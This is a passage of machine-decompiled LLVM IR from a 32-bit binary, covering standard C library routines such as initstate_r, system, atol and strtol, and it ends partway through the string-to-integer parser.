  store i32 %v3_8054e1a, i32* %eax.global-to-local, align 4
  %v2_8054e1d = add i32 %v0_8054e1a, 4
  %v3_8054e1d = inttoptr i32 %v2_8054e1d to i32*
  store i32 %v0_8054e1d, i32* %v3_8054e1d, align 4
  %v0_8054e20 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054e20 = load i32, i32* %eax.global-to-local, align 4
  %v2_8054e20 = mul i32 %v1_8054e20, 4
  %v3_8054e20 = add i32 %v2_8054e20, %v0_8054e20
  store i32 %v3_8054e20, i32* %eax.global-to-local, align 4
  %v1_8054e23 = load i32, i32* @esi, align 4
  %v2_8054e23 = inttoptr i32 %v1_8054e23 to i32*
  store i32 %v3_8054e20, i32* %v2_8054e23, align 4
  %v3_8054e25 = load i64, i64* %stack_var_-40, align 8
  %v6_8054e25 = mul nsw i64 %v3_8054e25, 10
  %v7_8054e25 = trunc i64 %v6_8054e25 to i32
  %v2_8054e2b = ptrtoint i32* %stack_var_-20 to i32
  %v1_8054e3825 = add i32 %v7_8054e25, -1
  %v9_8054e3829 = icmp slt i32 %v1_8054e3825, 0
  store i32 %v1_8054e3825, i32* @ebx, align 4
  %v1_8054e3930 = icmp eq i1 %v9_8054e3829, false
  br i1 %v1_8054e3930, label %dec_label_pc_8054e2b, label %dec_label_pc_8054e3b

dec_label_pc_8054e2b:                             ; preds = %dec_label_pc_8054e1a, %dec_label_pc_8054e2b
  store i32 %v2_8054e2b, i32* %eax.global-to-local, align 4
  %v0_8054e30 = load i32, i32* @esi, align 4
  %v2_8054e31 = inttoptr i32 %v0_8054e30 to i32*
  %v3_8054e31 = call i32 @__GI_random_r(i32* %v2_8054e31, i32 %v2_8054e2b)
  store i32 %v0_8054e30, i32* %eax.global-to-local, align 4
  store i32 %v2_8054e2b, i32* %edx.global-to-local, align 4
  %v0_8054e38.pre = load i32, i32* @ebx, align 4
  %v1_8054e38 = add i32 %v0_8054e38.pre, -1
  %v9_8054e38 = icmp slt i32 %v1_8054e38, 0
  store i32 %v1_8054e38, i32* @ebx, align 4
  %v1_8054e39 = icmp eq i1 %v9_8054e38, false
  br i1 %v1_8054e39, label %dec_label_pc_8054e2b, label %dec_label_pc_8054e3b

dec_label_pc_8054e3b:                             ; preds = %dec_label_pc_8054e1a, %dec_label_pc_8054e2b, %dec_label_pc_8054dc5
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054e3d

dec_label_pc_8054e3d:                             ; preds = %entry, %dec_label_pc_8054e3b
  %v0_8054e44 = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_8054e3b ]
  store i32 %v0_8054db1, i32* @ebx, align 4
  store i32 %v0_8054db0, i32* @esi, align 4
  store i32 %v0_8054daf, i32* @edi, align 4
  store i32 %v0_8054dab, i32* @ebp, align 4
  ret i32 %v0_8054e44

; uselistorder directives
  uselistorder i32 %v1_8054e38, { 1, 0 }
  uselistorder i32 %v0_8054e1a, { 1, 0 }
  uselistorder i32 %v1_8054e03, { 2, 1, 0 }
  uselistorder i32 %v2_8054e01, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v0_8054ddb, { 1, 0, 2 }
  uselistorder i32 %v3_8054dbd, { 1, 0, 2 }
  uselistorder i64* %stack_var_-40, { 2, 0, 1 }
  uselistorder i32 %tmp14, { 0, 2, 1 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 1, 3 }
  uselistorder i64 127773, { 1, 0 }
  uselistorder label %dec_label_pc_8054e3d, { 1, 0 }
  uselistorder label %dec_label_pc_8054e3b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054e2b, { 1, 0 }
  uselistorder label %dec_label_pc_8054de7, { 1, 0 }
}

define i32 @__GI_initstate_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg2 to i32
  %stack_var_-36 = alloca i32, align 4
  %v0_8054e47 = load i32, i32* @esi, align 4
  %v0_8054e48 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  store i32 %tmp7, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %tmp = icmp ult i32 %arg3, 128
  br i1 %tmp, label %dec_label_pc_8054e69, label %dec_label_pc_8054e5d

dec_label_pc_8054e5d:                             ; preds = %entry
  %v2_8054e5d = icmp ult i32 %arg3, 256
  %v1_8054e64 = select i1 %v2_8054e5d, i32 5, i32 4
  store i32 %v1_8054e64, i32* @ebx, align 4
  br label %dec_label_pc_8054e7f

dec_label_pc_8054e69:                             ; preds = %entry
  %v6_8054e6c = icmp ugt i32 %arg3, 31
  br i1 %v6_8054e6c, label %dec_label_pc_8054e77, label %dec_label_pc_8054e6e

dec_label_pc_8054e6e:                             ; preds = %dec_label_pc_8054e69
  store i32 0, i32* @ebx, align 4
  %v6_8054e73 = icmp ugt i32 %arg3, 7
  br i1 %v6_8054e73, label %dec_label_pc_8054e7f, label %dec_label_pc_8054ecf

dec_label_pc_8054e77:                             ; preds = %dec_label_pc_8054e69
  %v2_8054e77 = icmp ult i32 %arg3, 64
  %v1_8054e7c = select i1 %v2_8054e77, i32 3, i32 2
  store i32 %v1_8054e7c, i32* @ebx, align 4
  br label %dec_label_pc_8054e7f

dec_label_pc_8054e7f:                             ; preds = %dec_label_pc_8054e6e, %dec_label_pc_8054e5d, %dec_label_pc_8054e77
  %v0_8054e89 = phi i32 [ 0, %dec_label_pc_8054e6e ], [ %v1_8054e64, %dec_label_pc_8054e5d ], [ %v1_8054e7c, %dec_label_pc_8054e77 ]
  %v1_8054e7f = mul nuw nsw i32 %v0_8054e89, 4
  %v2_8054e7f = add i32 %v1_8054e7f, ptrtoint (i32* @global_var_805cdd4.549 to i32)
  %v3_8054e7f = inttoptr i32 %v2_8054e7f to i32*
  %v4_8054e7f = load i32, i32* %v3_8054e7f, align 4
  store i32 %v4_8054e7f, i32* %eax.global-to-local, align 4
  %v1_8054e86 = add i32 %tmp7, 4
  store i32 %v1_8054e86, i32* @esi, align 4
  %v2_8054e89 = add i32 %v1_8054e7f, ptrtoint (i32* @global_var_805cdc0.550 to i32)
  %v3_8054e89 = inttoptr i32 %v2_8054e89 to i32*
  %v4_8054e89 = load i32, i32* %v3_8054e89, align 4
  store i32 %v4_8054e89, i32* %edx.global-to-local, align 4
  %v2_8054e90 = add i32 %arg4, 12
  %v3_8054e90 = inttoptr i32 %v2_8054e90 to i32*
  store i32 %v0_8054e89, i32* %v3_8054e90, align 4
  %v0_8054e93 = load i32, i32* @esi, align 4
  %v1_8054e93 = load i32, i32* @edi, align 4
  %v2_8054e93 = add i32 %v1_8054e93, 8
  %v3_8054e93 = inttoptr i32 %v2_8054e93 to i32*
  store i32 %v0_8054e93, i32* %v3_8054e93, align 4
  %v0_8054e96 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054e96 = load i32, i32* @edi, align 4
  %v2_8054e96 = add i32 %v1_8054e96, 16
  %v3_8054e96 = inttoptr i32 %v2_8054e96 to i32*
  store i32 %v0_8054e96, i32* %v3_8054e96, align 4
  %v0_8054e99 = load i32, i32* @esi, align 4
  %v1_8054e99 = load i32, i32* %eax.global-to-local, align 4
  %v2_8054e99 = mul i32 %v1_8054e99, 4
  %v3_8054e99 = add i32 %v2_8054e99, %v0_8054e99
  store i32 %v3_8054e99, i32* %eax.global-to-local, align 4
  %v0_8054e9c = load i32, i32* %edx.global-to-local, align 4
  %v1_8054e9c = load i32, i32* @edi, align 4
  %v2_8054e9c = add i32 %v1_8054e9c, 20
  %v3_8054e9c = inttoptr i32 %v2_8054e9c to i32*
  store i32 %v0_8054e9c, i32* %v3_8054e9c, align 4
  %v0_8054e9f = load i32, i32* %eax.global-to-local, align 4
  %v1_8054e9f = load i32, i32* @edi, align 4
  %v2_8054e9f = add i32 %v1_8054e9f, 24
  %v3_8054e9f = inttoptr i32 %v2_8054e9f to i32*
  store i32 %v0_8054e9f, i32* %v3_8054e9f, align 4
  %v0_8054ea2 = load i32, i32* @edi, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_8054ea7 = inttoptr i32 %v0_8054ea2 to i32*
  %v3_8054ea7 = call i32 @srandom_r(i32 %arg1, i32* %v2_8054ea7)
  %v0_8054eac = load i32, i32* @ebp, align 4
  %v1_8054eac = inttoptr i32 %v0_8054eac to i32*
  store i32 0, i32* %v1_8054eac, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8054eb7 = load i32, i32* @ebx, align 4
  %v1_8054eb7 = icmp eq i32 %v0_8054eb7, 0
  br i1 %v1_8054eb7, label %dec_label_pc_8054ee8, label %dec_label_pc_8054ebb

dec_label_pc_8054ebb:                             ; preds = %dec_label_pc_8054e7f
  %v0_8054ebb = load i32, i32* @edi, align 4
  %v1_8054ebb = add i32 %v0_8054ebb, 4
  %v2_8054ebb = inttoptr i32 %v1_8054ebb to i32*
  %v3_8054ebb = load i32, i32* %v2_8054ebb, align 4
  %v1_8054ebe = load i32, i32* @esi, align 4
  %v2_8054ebe = sub i32 %v3_8054ebb, %v1_8054ebe
  %v2_8054ec0 = sdiv i32 %v2_8054ebe, 4
  %v3_8054ec3 = mul i32 %v2_8054ec0, 5
  %v2_8054ec6 = add i32 %v3_8054ec3, %v0_8054eb7
  %v1_8054ec8 = load i32, i32* @ebp, align 4
  %v2_8054ec8 = inttoptr i32 %v1_8054ec8 to i32*
  store i32 %v2_8054ec6, i32* %v2_8054ec8, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054ee8

dec_label_pc_8054ecf:                             ; preds = %dec_label_pc_8054e6e
  %v1_8054ecf = call i32 @__errno_location(i32 %v0_8054e48)
  store i32 %v1_8054ecf, i32* %eax.global-to-local, align 4
  %v1_8054ed4 = inttoptr i32 %v1_8054ecf to i32*
  store i32 22, i32* %v1_8054ed4, align 4
  %v0_8054eda = load i32, i32* %stack_var_-36, align 4
  %v1_8054eda = call i32 @__errno_location(i32 %v0_8054eda)
  %v1_8054edf = inttoptr i32 %v1_8054eda to i32*
  store i32 22, i32* %v1_8054edf, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054ee8

dec_label_pc_8054ee8:                             ; preds = %dec_label_pc_8054e7f, %dec_label_pc_8054ebb, %dec_label_pc_8054ecf
  %v0_8054eef = phi i32 [ 0, %dec_label_pc_8054e7f ], [ 0, %dec_label_pc_8054ebb ], [ -1, %dec_label_pc_8054ecf ]
  store i32 %v0_8054e47, i32* @esi, align 4
  ret i32 %v0_8054eef

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %arg3, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054ee8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8054e7f, { 2, 0, 1 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_8054ef0 = load i32, i32* @ebx, align 4
  %v4_8054ef9 = icmp eq i32 %arg1, 0
  br i1 %v4_8054ef9, label %dec_label_pc_805501c, label %dec_label_pc_8054f04

dec_label_pc_8054f04:                             ; preds = %entry
  %v2_8054f0a = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 1, i32* @edx, align 4
  %v2_8054f19 = call i32 @__bsd_signal(i32 2, i32 1)
  store i32 2, i32* @ebx, align 4
  %v2_8054f28 = call i32 @__bsd_signal(i32 17, i32 0)
  %v1_8054f31 = call i32 @__vfork(i32 %v2_8054f28)
  %v2_8054f39 = icmp slt i32 %v1_8054f31, 0
  store i32 %v1_8054f31, i32* @ebx, align 4
  %v2_8054f3e = icmp eq i1 %v2_8054f39, false
  br i1 %v2_8054f3e, label %dec_label_pc_8054f6f, label %dec_label_pc_8054f40

dec_label_pc_8054f40:                             ; preds = %dec_label_pc_8054f04
  %v2_8054f48 = call i32 @__bsd_signal(i32 3, i32 %v2_8054f0a)
  store i32 %v2_8054f0a, i32* @edx, align 4
  %v2_8054f55 = call i32 @__bsd_signal(i32 2, i32 %v2_8054f19)
  store i32 2, i32* @ebx, align 4
  %v2_8054f62 = call i32 @__bsd_signal(i32 17, i32 %v2_8054f28)
  br label %dec_label_pc_8055019

dec_label_pc_8054f6f:                             ; preds = %dec_label_pc_8054f04
  %v1_8054f39 = icmp eq i32 %v1_8054f31, 0
  %v1_8054f6f = icmp eq i1 %v1_8054f39, false
  br i1 %v1_8054f6f, label %dec_label_pc_8054fbb, label %dec_label_pc_8054f71

dec_label_pc_8054f71:                             ; preds = %dec_label_pc_8054f6f
  %v2_8054f77 = call i32 @__bsd_signal(i32 3, i32 0)
  store i32 0, i32* @edx, align 4
  %v2_8054f82 = call i32 @__bsd_signal(i32 2, i32 0)
  store i32 2, i32* @ebx, align 4
  %v2_8054f8d = call i32 @__bsd_signal(i32 17, i32 0)
  %v8_8054fac = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_805cdeb.553 to i32), i32 ptrtoint ([3 x i8]* @global_var_805cdf0.552 to i32), i32 ptrtoint ([3 x i8]* @global_var_805cde8.551 to i32), i32 %arg1, i32 0)
  %v1_8054fb6 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_8054fbb:                             ; preds = %dec_label_pc_8054f6f
  %v2_8054fc1 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 1, i32* @edx, align 4
  %v2_8054fcc = call i32 @__bsd_signal(i32 2, i32 1)
  %v2_8054fd1 = ptrtoint i32* %stack_var_-8 to i32
  %v0_8054fda = load i32, i32* @ebx, align 4
  %v7_8054fdb = call i32 @wait4(i32 %v0_8054fda, i32 %v2_8054fd1, i32 0, i32 0)
  %v8_8054fe6 = icmp eq i32 %v7_8054fdb, -1
  %v1_8054fe7 = icmp eq i1 %v8_8054fe6, false
  %v6_8054fe7 = load i32, i32* %stack_var_-8, align 4
  %v7_8054fe7 = select i1 %v1_8054fe7, i32 %v6_8054fe7, i32 -1
  store i32 %v7_8054fe7, i32* @edx, align 4
  store i32 %v7_8054fe7, i32* %stack_var_-8, align 4
  %v2_8054ff6 = call i32 @__bsd_signal(i32 3, i32 %v2_8054f0a)
  store i32 %v2_8054f0a, i32* @ebx, align 4
  %v2_8055003 = call i32 @__bsd_signal(i32 2, i32 %v2_8054f19)
  store i32 %v2_8054f19, i32* @edx, align 4
  %v2_8055010 = call i32 @__bsd_signal(i32 17, i32 %v2_8054f28)
  %v3_8055015 = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8055019

dec_label_pc_8055019:                             ; preds = %dec_label_pc_8054f40, %dec_label_pc_8054fbb
  %storemerge = phi i32 [ -1, %dec_label_pc_8054f40 ], [ %v3_8055015, %dec_label_pc_8054fbb ]
  br label %dec_label_pc_805501c

dec_label_pc_805501c:                             ; preds = %entry, %dec_label_pc_8055019
  %v0_8055020 = phi i32 [ 1, %entry ], [ %storemerge, %dec_label_pc_8055019 ]
  store i32 %v0_8054ef0, i32* @ebx, align 4
  ret i32 %v0_8055020

; uselistorder directives
  uselistorder i32 %v1_8054f31, { 2, 0, 1 }
  uselistorder i32 %v2_8054f28, { 1, 0, 2 }
  uselistorder i32 %v2_8054f19, { 0, 2, 1 }
  uselistorder i32 %v2_8054f0a, { 1, 3, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @execl, { 1, 0 }
  uselistorder i32 (i32)* @__vfork, { 1, 0 }
  uselistorder i32 (i32, i32)* @__bsd_signal, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 14 }
  uselistorder label %dec_label_pc_805501c, { 1, 0 }
  uselistorder label %dec_label_pc_8055019, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  %v3_805502f = call i32 @strtol(i32 %arg1, i32 0, i32 10)
  ret i32 %v3_805502f
}

define i32 @strtol(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8055049 = inttoptr i32 %arg1 to i8*
  %v5_8055049 = call i32 @_stdlib_strto_l(i8* %v4_8055049, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_8055049
}

define i32 @_stdlib_strto_l(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8055057 = load i32, i32* @ebx, align 4
  store i32 %v0_8055057, i32* %stack_var_-16, align 4
  %v4_805505b = ptrtoint i8* %arg1 to i32
  store i32 %v4_805505b, i32* @ecx, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  %v0_8055063 = load i32, i32* @global_var_805e1e8, align 8
  store i32 %v0_8055063, i32* %edx.global-to-local, align 4
  store i32 %v4_805505b, i32* %ebx.global-to-local, align 4
  %v2_805506e41 = load i8, i8* %arg1, align 1
  %v3_805506e42 = sext i8 %v2_805506e41 to i32
  store i32 %v3_805506e42, i32* %eax.global-to-local, align 4
  %v2_805507143 = mul nsw i32 %v3_805506e42, 2
  %v3_805507144 = add i32 %v2_805507143, %v0_8055063
  %v4_805507145 = inttoptr i32 %v3_805507144 to i8*
  %v5_805507146 = load i8, i8* %v4_805507145, align 1
  %v6_805507147 = and i8 %v5_805507146, 32
  %v7_805507148 = icmp eq i8 %v6_805507147, 0
  %v1_805507549 = icmp eq i1 %v7_805507148, false
  br i1 %v1_805507549, label %dec_label_pc_805506d, label %dec_label_pc_8055077

dec_label_pc_805506d:                             ; preds = %entry, %dec_label_pc_805506d
  %v0_805506d50 = phi i32 [ %v1_805506d, %dec_label_pc_805506d ], [ %v4_805505b, %entry ]
  %v1_805506d = add i32 %v0_805506d50, 1
  store i32 %v1_805506d, i32* %ebx.global-to-local, align 4
  %v1_805506e = inttoptr i32 %v1_805506d to i8*
  %v2_805506e = load i8, i8* %v1_805506e, align 1
  %v3_805506e = sext i8 %v2_805506e to i32
  store i32 %v3_805506e, i32* %eax.global-to-local, align 4
  %v2_8055071 = mul nsw i32 %v3_805506e, 2
  %v3_8055071 = add i32 %v2_8055071, %v0_8055063
  %v4_8055071 = inttoptr i32 %v3_8055071 to i8*
  %v5_8055071 = load i8, i8* %v4_8055071, align 1
  %v6_8055071 = and i8 %v5_8055071, 32
  %v7_8055071 = icmp eq i8 %v6_8055071, 0
  %v1_8055075 = icmp eq i1 %v7_8055071, false
  br i1 %v1_8055075, label %dec_label_pc_805506d, label %dec_label_pc_8055077

dec_label_pc_8055077:                             ; preds = %dec_label_pc_805506d, %entry
  %v0_805506d.lcssa = phi i32 [ %v4_805505b, %entry ], [ %v1_805506d, %dec_label_pc_805506d ]
  %v2_805506e.lcssa = phi i8 [ %v2_805506e41, %entry ], [ %v2_805506e, %dec_label_pc_805506d ]
  %v3_805506e.lcssa = phi i32 [ %v3_805506e42, %entry ], [ %v3_805506e, %dec_label_pc_805506d ]
  %tmp37 = trunc i32 %arg4 to i8
  %v9_8055077 = icmp eq i8 %v2_805506e.lcssa, 43
  br i1 %v9_8055077, label %dec_label_pc_8055092, label %dec_label_pc_805507c

dec_label_pc_805507c:                             ; preds = %dec_label_pc_8055077
  %v9_805507c = icmp eq i8 %v2_805506e.lcssa, 45
  %v1_8055084 = icmp eq i1 %v9_805507c, false
  br i1 %v1_8055084, label %dec_label_pc_8055093, label %dec_label_pc_8055092

dec_label_pc_8055092:                             ; preds = %dec_label_pc_8055077, %dec_label_pc_805507c
  %storemerge5 = phi i8 [ 1, %dec_label_pc_805507c ], [ 0, %dec_label_pc_8055077 ]
  %v1_8055092 = add i32 %v0_805506d.lcssa, 1
  store i32 %v1_8055092, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055093

dec_label_pc_8055093:                             ; preds = %dec_label_pc_805507c, %dec_label_pc_8055092
  %v0_80550a5 = phi i32 [ %v1_8055092, %dec_label_pc_8055092 ], [ %v0_805506d.lcssa, %dec_label_pc_805507c ]
  %stack_var_-18.0 = phi i8 [ %storemerge5, %dec_label_pc_8055092 ], [ 0, %dec_label_pc_805507c ]
  %v1_8055093 = and i32 %arg3, -17
  %v2_8055093 = icmp eq i32 %v1_8055093, 0
  %v1_805509b = icmp eq i1 %v2_8055093, false
  br i1 %v1_805509b, label %dec_label_pc_80550c1, label %dec_label_pc_805509d

dec_label_pc_805509d:                             ; preds = %dec_label_pc_8055093
  %v1_805509d = add i32 %arg3, 10
  store i32 %v1_805509d, i32* %esi.global-to-local, align 4
  %v1_80550a0 = inttoptr i32 %v0_80550a5 to i8*
  %v2_80550a0 = load i8, i8* %v1_80550a0, align 1
  %v8_80550a0 = icmp eq i8 %v2_80550a0, 48
  %v1_80550a3 = icmp eq i1 %v8_80550a0, false
  br i1 %v1_80550a3, label %dec_label_pc_80550b6, label %dec_label_pc_80550a5

dec_label_pc_80550a5:                             ; preds = %dec_label_pc_805509d
  %v1_80550a5 = add i32 %v0_80550a5, 1
  store i32 %v1_80550a5, i32* %ebx.global-to-local, align 4
  %v1_80550a6 = add i32 %arg3, 8
  store i32 %v1_80550a6, i32* %esi.global-to-local, align 4
  %v1_80550a9 = inttoptr i32 %v1_80550a5 to i8*
  %v2_80550a9 = load i8, i8* %v1_80550a9, align 1
  %v2_80550ad = or i8 %v2_80550a9, 32
  %v7_80550ad = zext i8 %v2_80550ad to i32
  %v9_80550ad = and i32 %v3_805506e.lcssa, -256
  %v10_80550ad = or i32 %v7_80550ad, %v9_80550ad
  store i32 %v10_80550ad, i32* %eax.global-to-local, align 4
  %v10_80550af = icmp eq i8 %v2_80550ad, 120
  %v1_80550b1 = icmp eq i1 %v10_80550af, false
  br i1 %v1_80550b1, label %dec_label_pc_80550b6, label %dec_label_pc_80550b3

dec_label_pc_80550b3:                             ; preds = %dec_label_pc_80550a5
  %v2_80550b3 = mul i32 %v1_80550a6, 2
  store i32 %v2_80550b3, i32* %esi.global-to-local, align 4
  %v1_80550b5 = add i32 %v0_80550a5, 2
  store i32 %v1_80550b5, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80550b6

dec_label_pc_80550b6:                             ; preds = %dec_label_pc_80550a5, %dec_label_pc_805509d, %dec_label_pc_80550b3
  %v0_80550de13 = phi i32 [ %v1_80550a5, %dec_label_pc_80550a5 ], [ %v0_80550a5, %dec_label_pc_805509d ], [ %v1_80550b5, %dec_label_pc_80550b3 ]
  %v0_805513822 = phi i32 [ %v1_80550a5, %dec_label_pc_80550a5 ], [ %v4_805505b, %dec_label_pc_805509d ], [ %v1_80550a5, %dec_label_pc_80550b3 ]
  %v3_80550be = phi i32 [ %v1_80550a6, %dec_label_pc_80550a5 ], [ %v1_805509d, %dec_label_pc_805509d ], [ %v2_80550b3, %dec_label_pc_80550b3 ]
  %v1_80550b6 = add i32 %v3_80550be, -17
  %v6_80550b6 = sub i32 16, %v3_80550be
  %v7_80550b6 = and i32 %v6_80550b6, %v3_80550be
  %v8_80550b6 = icmp slt i32 %v7_80550b6, 0
  %v10_80550b6 = icmp slt i32 %v1_80550b6, 0
  store i32 16, i32* %eax.global-to-local, align 4
  %v2_80550be = icmp eq i1 %v10_80550b6, %v8_80550b6
  %v5_80550be = select i1 %v2_80550be, i32 16, i32 %v3_80550be
  store i32 %v5_80550be, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80550c1

dec_label_pc_80550c1:                             ; preds = %dec_label_pc_8055093, %dec_label_pc_80550b6
  %v0_805513823 = phi i32 [ %v4_805505b, %dec_label_pc_8055093 ], [ %v0_805513822, %dec_label_pc_80550b6 ]
  %v0_80550de12 = phi i32 [ %v0_80550a5, %dec_label_pc_8055093 ], [ %v0_80550de13, %dec_label_pc_80550b6 ]
  %v0_80550d0 = phi i32 [ %arg3, %dec_label_pc_8055093 ], [ %v5_80550be, %dec_label_pc_80550b6 ]
  %v1_80550c1 = add i32 %v0_80550d0, -2
  store i32 %v1_80550c1, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v6_80550c9 = icmp ugt i32 %v1_80550c1, 34
  br i1 %v6_80550c9, label %dec_label_pc_805512d, label %dec_label_pc_80550cb

dec_label_pc_80550cb:                             ; preds = %dec_label_pc_80550c1
  %div = udiv i32 -1, %v0_80550d0
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp38 = urem i32 -1, %v0_80550d0
  %v1_80550d2 = trunc i32 %tmp38 to i8
  store i32 %div, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v4_805510b = urem i32 %arg4, 256
  br label %dec_label_pc_80550de

dec_label_pc_80550dc:                             ; preds = %dec_label_pc_8055123, %dec_label_pc_805510b
  %v2_80550e0.pre = phi i32 [ %v0_8055126, %dec_label_pc_8055123 ], [ %v2_80550e0.pre.pre, %dec_label_pc_805510b ]
  %v4_80550de.pre = phi i32 [ %v1_80550f7, %dec_label_pc_8055123 ], [ %v4_80550de.pre.pre, %dec_label_pc_805510b ]
  %v0_80550dc = phi i32 [ %v1_80550fe, %dec_label_pc_8055123 ], [ %v0_80550dc.pre, %dec_label_pc_805510b ]
  %stack_var_-18.1 = phi i8 [ %stack_var_-18.2, %dec_label_pc_8055123 ], [ %v6_805510f, %dec_label_pc_805510b ]
  br label %dec_label_pc_80550de

dec_label_pc_80550de:                             ; preds = %dec_label_pc_80550cb, %dec_label_pc_80550dc
  %v0_805513821 = phi i32 [ %v0_805513823, %dec_label_pc_80550cb ], [ %v0_80550dc, %dec_label_pc_80550dc ]
  %v0_80550fe = phi i32 [ %v0_80550de12, %dec_label_pc_80550cb ], [ %v0_80550dc, %dec_label_pc_80550dc ]
  %v2_80550e0 = phi i32 [ %v4_805505b, %dec_label_pc_80550cb ], [ %v2_80550e0.pre, %dec_label_pc_80550dc ]
  %v4_80550de = phi i32 [ %div, %dec_label_pc_80550cb ], [ %v4_80550de.pre, %dec_label_pc_80550dc ]
  %stack_var_-18.2 = phi i8 [ %stack_var_-18.0, %dec_label_pc_80550cb ], [ %stack_var_-18.1, %dec_label_pc_80550dc ]
  %v1_80550de = inttoptr i32 %v0_80550fe to i8*
  %v2_80550de = load i8, i8* %v1_80550de, align 1
  %v3_80550de = zext i8 %v2_80550de to i32
  %v5_80550de = and i32 %v4_80550de, -256
  %v6_80550de = or i32 %v3_80550de, %v5_80550de
  store i32 %v6_80550de, i32* %eax.global-to-local, align 4
  %v2_80550e2 = add i8 %v2_80550de, -48
  %v12_80550e2 = zext i8 %v2_80550e2 to i32
  %v14_80550e2 = and i32 %v2_80550e0, -256
  %v15_80550e2 = or i32 %v12_80550e2, %v14_80550e2
  store i32 %v15_80550e2, i32* @ecx, align 4
  %tmp = icmp ult i8 %v2_80550e2, 10
  br i1 %tmp, label %dec_label_pc_80550f7, label %dec_label_pc_80550ea

dec_label_pc_80550ea:                             ; preds = %dec_label_pc_80550de
  %v2_80550ea = or i8 %v2_80550de, 32
  %v7_80550ea = zext i8 %v2_80550ea to i32
  %v10_80550ea = or i32 %v7_80550ea, %v5_80550de
  store i32 %v10_80550ea, i32* %eax.global-to-local, align 4
  %v2_80550ec = or i32 %v14_80550e2, 40
  store i32 %v2_80550ec, i32* @ecx, align 4
  %tmp55 = icmp ult i8 %v2_80550ea, 97
  br i1 %tmp55, label %dec_label_pc_80550f7, label %dec_label_pc_80550f2

dec_label_pc_80550f2:                             ; preds = %dec_label_pc_80550ea
  %v2_80550f4 = add i8 %v2_80550ea, -87
  %v15_80550f4 = zext i8 %v2_80550f4 to i32
  %v18_80550f4 = or i32 %v15_80550f4, %v14_80550e2
  store i32 %v18_80550f4, i32* @ecx, align 4
  br label %dec_label_pc_80550f7

dec_label_pc_80550f7:                             ; preds = %dec_label_pc_80550ea, %dec_label_pc_80550de, %dec_label_pc_80550f2
  %v0_8055126 = phi i32 [ %v2_80550ec, %dec_label_pc_80550ea ], [ %v15_80550e2, %dec_label_pc_80550de ], [ %v18_80550f4, %dec_label_pc_80550f2 ]
  %v1_80550f7 = urem i32 %v0_8055126, 256
  store i32 %v1_80550f7, i32* %eax.global-to-local, align 4
  %v1_80550fa = load i32, i32* %esi.global-to-local, align 4
  %v2_80550fa = sub i32 %v1_80550f7, %v1_80550fa
  %v10_80550fa = and i32 %v2_80550fa, %v1_80550fa
  %v11_80550fa = icmp slt i32 %v10_80550fa, 0
  %v13_80550fa = icmp slt i32 %v2_80550fa, 0
  %v2_80550fc = icmp eq i1 %v13_80550fa, %v11_80550fa
  br i1 %v2_80550fc, label %dec_label_pc_805512d, label %dec_label_pc_80550fe

dec_label_pc_80550fe:                             ; preds = %dec_label_pc_80550f7
  %v1_80550fe = add i32 %v0_80550fe, 1
  store i32 %v1_80550fe, i32* %ebx.global-to-local, align 4
  %v0_80550ff = load i32, i32* %edx.global-to-local, align 4
  %v1_80550ff = load i32, i32* %ebp.global-to-local, align 4
  %tmp56 = icmp ugt i32 %v0_80550ff, %v1_80550ff
  br i1 %tmp56, label %dec_label_pc_805510b, label %dec_label_pc_8055103

dec_label_pc_8055103:                             ; preds = %dec_label_pc_80550fe
  %v12_80550ff = icmp eq i32 %v0_80550ff, %v1_80550ff
  %v1_8055103 = icmp eq i1 %v12_80550ff, false
  br i1 %v1_8055103, label %dec_label_pc_8055123, label %dec_label_pc_8055105

dec_label_pc_8055105:                             ; preds = %dec_label_pc_8055103
  %v1_8055105 = trunc i32 %v0_8055126 to i8
